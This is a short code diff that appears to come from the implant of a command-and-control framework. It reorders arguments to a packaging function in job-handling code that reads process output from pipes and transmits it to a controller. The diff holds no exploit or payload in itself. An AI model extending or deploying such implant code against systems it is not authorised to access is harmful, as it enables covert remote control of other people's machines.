@@ -115,7 +115,7 @@ VOID JobCheckList()
                         AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );
 
                         // notify the TS that the process is dead, so that the RequestID can be closed
-                        PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_COMMAND_JOB );
+                        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_JOB, JobList->RequestID );
                         PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );
                         PackageTransmit( Package );
 
@@ -157,7 +157,7 @@ VOID JobCheckList()
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
                                     PackageTransmit( Package );
                                 }
@@ -352,7 +352,7 @@ BOOL JobKill( DWORD JobID )
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
                                     PackageTransmit( Package );
                                 }
